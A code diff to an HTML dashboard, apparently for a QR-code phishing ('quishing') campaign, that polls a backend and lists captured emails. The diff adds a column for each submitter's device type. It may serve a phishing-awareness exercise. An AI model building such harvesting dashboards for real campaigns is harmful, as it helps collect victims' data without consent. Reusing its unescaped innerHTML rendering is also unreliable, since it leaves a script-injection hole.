@@ -37,6 +37,7 @@
                     <tr>
                         <th>Hora</th>
                         <th>Email</th>
+                        <th>Dispositivo</th>
                     </tr>
                 </thead>
                 <tbody id="submissionsTableBody">
@@ -47,7 +48,7 @@
         <p><em>By Cyberdark</em></p>
     </div>
 
-   <script>
+<script>
     const API_URL = 'https://quishing-ashy.vercel.app/api/get-stats';
 
     async function fetchStats() {
@@ -61,7 +62,8 @@
         } catch (error) {
             console.error("No se pudieron obtener las estadísticas:", error);
             const tableBody = document.getElementById('submissionsTableBody');
-            tableBody.innerHTML = `<tr><td colspan="2" style="text-align:center; color:red;">Error al cargar los datos en vivo. Asegúrate de que el backend esté funcionando.</td></tr>`;
+            // El colspan vuelve a ser 3
+            tableBody.innerHTML = `<tr><td colspan="3" style="text-align:center; color:red;">Error al cargar los datos en vivo. Asegúrate de que el backend esté funcionando.</td></tr>`;
         }
     }
 
@@ -77,7 +79,8 @@
         tableBody.innerHTML = ''; 
 
         if (!latestSubmissions || latestSubmissions.length === 0) {
-            tableBody.innerHTML = '<tr><td colspan="2" style="text-align:center;">Aún no hay datos enviados.</td></tr>';
+            // El colspan vuelve a ser 3
+            tableBody.innerHTML = '<tr><td colspan="3" style="text-align:center;">Aún no hay datos enviados.</td></tr>';
         } else {
             for (const submission of latestSubmissions) {
                 const row = document.createElement('tr');
@@ -87,14 +90,16 @@
                     second: '2-digit'
                 });
                 const email = submission.email;
+                // Volvemos a extraer el tipo de dispositivo
+                const device = submission.device_info ? submission.device_info.deviceType : 'Desconocido';
 
-               
-                row.innerHTML = `<td>${time}</td><td>${email}</td>`;
+                // Volvemos a añadir la celda para el dispositivo
+                row.innerHTML = `<td>${time}</td><td>${email}</td><td>${device}</td>`;
                 tableBody.appendChild(row);
             }
         }
     }
-    
+
     window.onload = fetchStats;
     setInterval(fetchStats, 5000);
 </script>
